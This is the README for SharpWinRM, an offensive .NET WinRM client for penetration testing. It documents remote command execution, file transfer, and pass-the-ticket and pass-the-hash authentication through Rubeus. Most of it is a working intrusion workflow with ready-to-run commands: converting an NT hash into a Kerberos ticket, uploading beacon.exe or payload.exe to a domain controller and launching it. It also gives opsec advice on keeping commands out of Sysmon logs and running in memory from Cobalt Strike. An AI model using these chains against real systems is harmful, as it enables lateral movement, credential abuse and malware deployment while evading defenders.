# SharpWinRM

A .NET 4.8 WinRM client for authorized penetration testing. Supports command execution, file upload, file download, and port scanning via multiple authentication modes including Kerberos pass-the-ticket and pass-the-hash (via Rubeus).

---

## Table of Contents

- [Building](#building)
- [How It Works](#how-it-works)
- [Authentication Modes](#authentication-modes)
- [Pass-the-Hash with Rubeus](#pass-the-hash-with-rubeus)
- [Commands](#commands)
- [Opsec Notes](#opsec-notes)
- [Usage Examples](#usage-examples)

---

## Building

### Prerequisites

- [.NET SDK](https://dotnet.microsoft.com/download) (any recent version — 6, 7, 8)
- **.NET Framework 4.8 targeting pack** — required because the project targets `net48`
  - Already present on any Windows machine with .NET 4.8 installed
  - On a fresh build machine: install via Visual Studio Installer → Individual Components → ".NET Framework 4.8 targeting pack", or download directly from Microsoft

No third-party NuGet packages are used. All references (`Microsoft.CSharp`, `System.Net.Http`) are .NET Framework assemblies already on the machine.

### CLI (dotnet)

```
cd SharpWinRM
dotnet build -c Release
```

`dotnet build` automatically runs `dotnet restore` first, which contacts NuGet to pull down the SDK build tooling (not external packages — the project has none). If you're building on an air-gapped machine, run `dotnet restore` once with internet access first; subsequent builds will use the local cache.

Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`

### Visual Studio

1. Open `SharpWinRM.sln`
2. Set configuration to **Release** (dropdown at the top)
3. **Build → Build Solution** (or `Ctrl+Shift+B`)

Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`

### Single-file publish (optional)

```
dotnet publish -c Release -r win-x64 --self-contained false
```

This produces the same `SharpWinRM.exe` in `bin\Release\net48\win-x64\publish\`. For `execute-assembly` use, the standard `dotnet build` output is sufficient.

---

## How It Works

### WinRM / WS-Management Protocol

WinRM (Windows Remote Management) is Microsoft's implementation of the [WS-Management](https://www.dmtf.org/standards/wsman) (WS-Man) SOAP protocol. It listens on:

- **Port 5985** — HTTP transport
- **Port 5986** — HTTPS transport (TLS)

All communication is SOAP XML over HTTP(S). SharpWinRM uses the **WSMan.Automation COM object** (`wsmauto.dll`) — the same library used by PowerShell Remoting and the built-in `winrm.exe` — so the WinRM traffic is indistinguishable from legitimate Windows remote management activity.

### Shell Execution Model

For `exec` and `download`, SharpWinRM:

1. Creates a WS-Management shell resource (`cmd.exe`) via a WS-Transfer `Create` request
2. Sends a `Command` action to start the process
3. Polls with `Receive` actions to collect stdout/stderr
4. Sends a `Signal` (ctrl_c) to terminate, then deletes the shell

For `upload`, the shell runs `powershell.exe` directly and the file data is streamed into the process via the WS-Management `Send` (stdin) action.

### HTTP vs HTTPS

| | Port 5985 (HTTP) | Port 5986 (HTTPS) |
|---|---|---|
| Transport encryption | None | TLS — hides all HTTP framing |
| Content encryption | NTLM/Kerberos message-level sealing | TLS + NTLM/Kerberos |
| Wire visibility | HTTP headers visible, SOAP body encrypted | Everything encrypted |
| Recommendation | Use when 5986 unavailable | Preferred for opsec |

Over HTTP, NTLM and Kerberos both provide **message-level encryption** of the SOAP body via RC4/AES sealing — the actual command content is not cleartext even without TLS. However, HTTPS additionally hides HTTP metadata (headers, request size, timing) from network monitoring.

---

## Authentication Modes

### `/password:` — Plaintext Credentials

```
/user:DOMAIN\user /password:Pass1
```

**How it works:**

1. Calls `LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS=9, WINNT50)` to create a *netonly* logon session
2. Impersonates that session for the WinRM call
3. WSMan.Automation uses Windows SSPI — Windows chooses NTLM or Kerberos based on environment

The type-9 logon never validates credentials against a DC locally — it only affects outbound network authentication. Credentials are not cached in your existing session.

**Opsec considerations:**
- Plaintext password passes through LSASS for the LogonUser call
- NTLM challenge-response visible on the wire (detectable)
- Windows event log: Logon Type 9 (NewCredentials) on the local machine

---

### `/ptt` — Pass-the-Ticket (existing session)

```
/user:DOMAIN\user /ptt
```

**How it works:**

Uses the Kerberos ticket(s) already present in your current logon session. Verify with `klist`. WSMan.Automation uses SSPI which picks up the existing TGT/service ticket automatically — no credential material is passed.

**Opsec considerations:**
- No credentials in memory beyond what's already there
- Kerberos TGS-REQ/TGS-REP for the WinRM service principal (indistinguishable from normal auth)
- No NTLM traffic
- **Most opsec-safe option when you already have a valid ticket**

---

### `/ticket:` — Import Kerberos Ticket (isolated session)

```
/user:DOMAIN\user /ticket:user.kirbi
/user:DOMAIN\user /ticket:doIFuj...  (base64 kirbi)
```

**How it works:**

1. Calls `LogonUser(dummy_creds, LOGON32_LOGON_NEW_CREDENTIALS=9)` to create a fresh isolated logon session with a new LUID — credentials are never validated
2. Calls `DuplicateTokenEx` to get an impersonation token for the new session
3. Calls `WindowsIdentity.Impersonate()` — the current thread now runs as the isolated session
4. Calls `LsaCallAuthenticationPackage(KerbSubmitTicketMessage)` with the kirbi bytes — imports the TGT into the isolated session's Kerberos cache (LUID `{0,0}` resolves to the impersonated session, not your real session)
5. Makes the WinRM call under impersonation — SSPI picks up the ticket from the isolated session
6. On `Dispose()`: reverts impersonation, closes token handles — Windows destroys the logon session and purges its Kerberos ticket cache automatically

**Your session is never touched.** `klist` before and after will show no change.

**Opsec considerations:**
- No NTLM traffic — pure Kerberos
- The ticket is isolated and self-cleaning
- No new process spawned (unlike `runas /netonly`)
- Kerberos TGS-REQ for `http/target` SPN is normal DC traffic

---

## Pass-the-Hash with Rubeus

Windows SSPI has no public API that accepts an NT hash directly — it requires a plaintext password to derive the hash internally. To use an NT hash with SharpWinRM, use Rubeus to convert the hash into a Kerberos TGT (overpass-the-hash / AS-REQ with RC4 pre-auth), then pass the ticket.

### Step 1 — Request a TGT from the NT hash

```
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:jdoe.kirbi
```

Rubeus sends a Kerberos AS-REQ to the Domain Controller using the NT hash as the RC4 session key for pre-authentication. The DC validates the hash against its copy in AD and returns a TGT encrypted for the user.

Alternatively, request in base64 format (no file written to disk):
```
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /nowrap
```

### Step 2 — Use the ticket with SharpWinRM

```
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:whoami
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:doIFuj...   /command:whoami
```

The `/ticket:` path accepts either a `.kirbi` file path or the raw base64 string from Rubeus's `nowrap` output.

### Why not direct NTLM PTH?

NTLM pass-the-hash over WinRM requires a manual NTLM implementation that bypasses Windows SSPI entirely — constructing NTLMv2 challenge-response manually and handling WinRM's multipart message-level encryption. This approach conflicts with IIS/WinRM server configurations in many environments (MaxRequestBytes limits, WAF rules, strict Negotiate-only enforcement). The Rubeus workflow is more reliable and produces Kerberos traffic, which is less suspicious than NTLM.

---

## Commands

### `scan` — Port Discovery

```
SharpWinRM.exe scan /target:HOST
```

TCP connect check on ports 5985 and 5986. No authentication required. Use this first to determine whether to use `/ssl`.

```
[*] Target : srv01.corp.local

[+] 5985 OPEN  — WinRM HTTP  (use without /ssl)
[+] 5986 OPEN  — WinRM HTTPS (use /ssl for encrypted transport)

[*] Recommendation: use /ssl (port 5986) — TLS hides SOAP traffic from the wire
```

---

### `exec` — Command Execution

```
SharpWinRM.exe exec /target:HOST <auth> /command:CMD
```

Runs `cmd.exe /c CMD` on the remote host and returns stdout+stderr.

Commands with spaces are supported without quoting:
```
SharpWinRM.exe exec ... /command:dir C:\Windows\Temp
SharpWinRM.exe exec ... /command:net user administrator
```

**Remote process chain:** `svchost → WsmService → cmd.exe /c CMD`

---

### `invoke` — PowerShell Execution via stdin

```
SharpWinRM.exe invoke /target:HOST <auth> /command:PS_COMMAND
```

Executes a PowerShell command on the remote host by piping it through the WinRM stdin channel — the same delivery mechanism used by `upload`. The command never appears in any process argument list.

```
SharpWinRM.exe invoke ... /command:Get-LocalUser
SharpWinRM.exe invoke ... /command:Get-Process | Select Name,Id
```

**Remote process chain:** `svchost → powershell.exe -NoProfile -NonInteractive -`

**How it differs from `exec`:**

| | `exec` | `invoke` |
|---|---|---|
| Remote process | `cmd.exe /c <command>` | `powershell.exe -NoProfile -NonInteractive -` |
| Command in process args | **Yes** — Sysmon Event ID 1 | **No** — travels through WinRM stdin |
| PowerShell Script Block Logging | N/A | Captured if enabled (Event ID 4104) |
| AMSI inspection | No | Yes — at runtime |
| Accepts PowerShell syntax | No | Yes |

**What EDR sees on the remote host:**
- Process creation: `powershell.exe -NoProfile -NonInteractive -`
- Command line contains **no command data** — data travels through the WinRM stdin channel
- If PowerShell Script Block Logging is enabled, the command will be captured in Event ID 4104

---

### `upload` — File Upload

```
SharpWinRM.exe upload /target:HOST <auth> /local:C:\tools\beacon.exe /remote:C:\Windows\Temp
```

If `/remote:` is a directory path (no file extension, or trailing `\`), the local filename is appended automatically:
```
/remote:C:\Windows\Temp          → C:\Windows\Temp\beacon.exe
/remote:C:\Windows\Temp\         → C:\Windows\Temp\beacon.exe
/remote:C:\Windows\Temp\b.exe    → C:\Windows\Temp\b.exe
```

**How it works (opsec design):**

1. Reads the local file and splits into 48 KB binary chunks
2. Each chunk is base64-encoded into a PowerShell `[IO.File]::OpenWrite` / `Write` statement
3. The complete PS script is UTF-8 encoded and streamed to the remote via the **WinRM `Send` (stdin) action**
4. Remote process: `powershell.exe -NoProfile -NonInteractive -` (stdin mode)

**What EDR sees on the remote host:**
- Process creation: `powershell.exe -NoProfile -NonInteractive -`
- Command line contains **no file data** — data travels through the WinRM stdin channel
- If PowerShell Script Block Logging is enabled, the decode script (including base64 chunks) will be captured in the event log

---

### `download` — File Download

```
SharpWinRM.exe download /target:HOST <auth> /remote:C:\Windows\Temp\output.txt /local:output.txt
```

**How it works (opsec design):**

Runs `cmd.exe /c type "remote_path"` — no PowerShell spawned. Raw bytes flow through the WinRM stdout pipe (binary-safe via pipe mode) and are written directly to the local file.

**What EDR sees on the remote host:**
- Process creation: `cmd.exe /c type "C:\path\file.txt"`
- No PowerShell, no AMSI, no script block logging

> **Note:** `type` reads through a stdout pipe which is binary-safe on modern Windows for most file types. Files containing `0x1A` bytes (Ctrl-Z, rare in text files but possible in PE binaries) may be truncated. For downloading executables, use SMB directly.

---

## Opsec Notes

### Local machine (where SharpWinRM runs)

- WSMan.Automation (`wsmauto.dll`) is loaded in-process — **no new processes created**
- Designed for inline execution from Cobalt Strike `execute-assembly`
- For `/ticket:`: no `runas /netonly`, no child process, no LSASS interaction beyond standard SSPI

### Remote machine (target)

| Operation | Remote process | Data in command line |
|---|---|---|
| `exec` | `cmd.exe /c <command>` | Yes — the command |
| `invoke` | `powershell.exe -NoProfile -NonInteractive -` | No — command via stdin |
| `upload` | `powershell.exe -NoProfile -NonInteractive -` | No — data via stdin |
| `download` | `cmd.exe /c type "path"` | No — path only |

### Authentication opsec ranking

1. **`/ptt`** — Best. Uses existing ticket, no new logon session, no credential material
2. **`/ticket:`** — Best for imported hashes. Isolated session, self-cleaning, pure Kerberos
3. **`/password:`** — Acceptable. Type-9 logon (no local validation), but NTLM on the wire is detectable

### Network indicators

- WinRM traffic to port 5985/5986 from an unexpected host may trigger alerts
- Kerberos TGS-REQ for `http/target.domain` SPN is logged on the DC (normal Kerberos behavior)
- NTLM authentication (password mode in non-Kerberos environments) is logged on the DC and visible on the wire

---

## Usage Examples

```
# Discover WinRM ports first
SharpWinRM.exe scan /target:srv01.corp.local

# Execute with plaintext credentials (HTTPS)
SharpWinRM.exe exec /target:srv01 /domain:CORP /user:jdoe /password:Pass1! /ssl /command:whoami

# Execute using existing Kerberos ticket
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:ipconfig /all

# PTH workflow: NT hash → TGT → exec
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /nowrap
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:doIFuj... /command:whoami

# PTH workflow with kirbi file
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:jdoe.kirbi
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:whoami /ssl

# Upload payload (PowerShell via stdin — no data in command line)
SharpWinRM.exe upload /target:srv01 /user:CORP\jdoe /ptt /local:beacon.exe /remote:C:\Windows\Temp

# Execute uploaded payload (exec — process args visible but it's just a path)
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:C:\Windows\Temp\beacon.exe

# Invoke PowerShell command via stdin (command NOT in process args — no Sysmon EID 1 logging)
SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:Get-LocalUser
SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:whoami /groups

# Download output file (cmd.exe type — no PowerShell)
SharpWinRM.exe download /target:srv01 /user:CORP\jdoe /ptt /remote:C:\Windows\Temp\output.txt /local:output.txt

# Full PTH chain over HTTPS
Rubeus.exe asktgt /user:svc_admin /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:svc.kirbi
SharpWinRM.exe scan    /target:dc01.corp.local
SharpWinRM.exe upload  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /local:payload.exe /remote:C:\Windows\Temp
SharpWinRM.exe invoke  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:Start-Process C:\Windows\Temp\payload.exe
SharpWinRM.exe download /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /remote:C:\Windows\Temp\out.txt /local:out.txt
```

---

## Full Argument Reference

```
SharpWinRM.exe <command> [options]

COMMANDS
  scan      /target:HOST
  exec      /target:HOST <auth> /command:CMD          (cmd.exe — command visible in process args)
  invoke    /target:HOST <auth> /command:PS_COMMAND   (PowerShell stdin — command NOT in process args)
  upload    /target:HOST <auth> /local:PATH /remote:PATH
  download  /target:HOST <auth> /remote:PATH /local:PATH

AUTH (pick one)
  /password:PASS     Plaintext password (requires /user: and optionally /domain:)
  /ptt               Use Kerberos ticket already in current session
  /ticket:VALUE      Import kirbi file or base64 kirbi string into isolated session

REQUIRED (exec / upload / download)
  /target:HOST       Hostname or IP of the remote machine
  /user:USER         Username — accepts DOMAIN\USER or user@domain formats
  /domain:DOMAIN     Domain (if not embedded in /user:)

OPTIONS
  /port:N            WinRM port (default: 5985)
  /ssl               Use HTTPS/TLS (defaults to port 5986)
  /timeout:MS        Timeout in milliseconds (default: 30000)
  /nocolors          Disable colored output (useful for log capture)
```
